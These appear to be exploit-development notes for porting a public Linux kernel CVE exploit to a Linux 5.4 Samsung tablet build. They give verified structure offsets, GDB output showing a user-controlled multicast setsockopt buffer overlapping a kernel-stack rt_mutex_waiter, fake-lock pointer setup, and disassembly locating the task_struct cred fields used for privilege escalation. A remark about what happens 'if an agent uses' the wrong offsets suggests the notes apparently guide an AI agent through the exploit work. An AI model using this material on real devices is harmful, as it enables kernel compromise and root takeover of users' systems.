# 02. GDB Verified Ground Truth & Offset Proofs

## 1. The `rt_mutex_waiter` Structure (Linux 5.4 vs 5.15)

A major trap when porting public CVE-2026-43499 exploits (which target Linux 5.15 or 6.1) to Linux 5.4 is the `rt_mutex_waiter` layout.

### Layout on SM-X216B (Linux 5.4): Exactly 80 Bytes (`0x50`)
Disassembly of `remove_waiter` (`0xffffffc010376418`) and `rt_mutex_adjust_prio_chain` (`0xffffffc0103753bc`):

```c
struct rt_mutex_waiter {
    struct rb_node          tree_entry;     /* offset 0x00, size 24 */
    struct rb_node          pi_tree_entry;  /* offset 0x18, size 24 */
    struct task_struct     *task;           /* offset 0x30, size 8 (Word 6) */
    struct rt_mutex        *lock;           /* offset 0x38, size 8 (Word 7) */
    int                     prio;           /* offset 0x40, size 4 (Word 8) */
    unsigned short          deadlocked;     /* offset 0x44, size 2 */
    u64                     deadline;       /* offset 0x48, size 8 (Word 9) */
}; /* Total: 80 bytes (0x50) */
```

### Critical Differences from Linux 5.15 / 6.1
- In Linux 5.15, `wake_state` (+0x40) was introduced, expanding the waiter to **88 bytes** (`0x58`).
- On Linux 5.4, **`wake_state` DOES NOT EXIST**. `task` is at `+0x30` and `lock` is at `+0x38`.
- If an agent uses 5.15's `task` (+0x38) or `lock` (+0x40), the kernel dereferences wrong pointers, triggering an instant kernel panic on `rt_mutex_adjust_prio_chain`.

---

## 2. Dynamic MCAST Stack Overlap (Live GDB Measurement)

Executed in QEMU via `minimal-rmg-ipv4/scripts/verify_mcast.sh` with hardware breakpoints on `task_blocks_on_rt_mutex` and `copy_from_user`:

```
[BREAKPOINT #1] task_blocks_on_rt_mutex @ 0xffffffc01037606c
  Kernel Stack Base: 0xffffffc017130000
  Waiter Address:    0xffffffc017133cd8
  Waiter Stack Off:  0x3cd8 (15576 bytes)

[BREAKPOINT #2] IPv4 MCAST copy_from_user @ 0xffffffc0113b6178
  Kernel Stack Base: 0xffffffc017130000
  Buffer Address:    0xffffffc017133c00 (SP + 0x20)
  Buffer Stack Off:  0x3c00 (15360 bytes)
  Payload Length:    264 bytes (0x108)

[CALCULATED DELTA] 0x3cd8 - 0x3c00 = 0x00d8 (216 bytes)
```

### Overlap Mechanics
1. **Waiter Base**: Lands at **byte 216 (`0xd8`)** of the 264-byte `group_source_req` buffer.
2. **`waiter->tree_entry`**: Bytes 216 to 239 (`0xd8` to `0xef`). Controlled by user buffer.
3. **`waiter->pi_tree_entry`**: Bytes 240 to 263 (`0xf0` to `0x107`). Controlled by user buffer.
4. **`waiter->task` (+0x30)**: Lands at **byte 264 (`0x108`)** from buffer start.
5. **`waiter->lock` (+0x38)**: Lands at **byte 272 (`0x110`)**.
   - Note: Because the 264-byte `setsockopt` payload ends at byte 264, `waiter->lock` is 8 bytes beyond the IPv4 buffer.
   - It is initialized during the initial carrier stamp (via `sigreturn` reload or pre-existing stack content) so `lock` points safely to `ADDR_FAKE_LOCK`.

---

## 3. Disassembly Evidence: `task_struct` Offsets

Verified via Capstone analysis of `vmlinux.elf`:

### `pi_lock` and `pi_blocked_on` in `remove_waiter` (`0xffffffc010376418`):
```assembly
0xffffffc010376450: mrs   x20, sp_el0         ; x20 = current task_struct
0xffffffc010376454: add   x21, x20, #0x8dc    ; x21 = &task->pi_lock (+0x8dc)
0xffffffc010376498: str   xzr, [x20, #0x900]  ; task->pi_blocked_on = NULL (+0x900)
```

### `pi_waiters` and `prio` in `rt_mutex_adjust_prio_chain` (`0xffffffc0103753bc`):
```assembly
0xffffffc010375414: add   x26, x19, #0x8dc    ; &task->pi_lock (+0x8dc)
0xffffffc010375424: ldr   x25, [x19, #0x900]  ; x25 = task->pi_blocked_on (+0x900)
0xffffffc01037544c: ldr   x8, [x19, #0x8e8]   ; x8 = task->pi_waiters.rb_node (+0x8e8)
0xffffffc010375478: ldr   w8, [x19, #0x7c]    ; w8 = task->prio (+0x7c)
0xffffffc01037547c: ldr   w9, [x25, #0x40]    ; w9 = waiter->prio (+0x40)
```

### `cred` and `real_cred` in `delayed_put_task_struct` (`0xffffffc0102a7818`):
```assembly
0xffffffc0102a7830: ldr   x0, [x19, #0x800]   ; x0 = task->real_cred (+0x800)
0xffffffc0102a7834: ldr   x1, [x19, #0x808]   ; x1 = task->cred (+0x808)
```
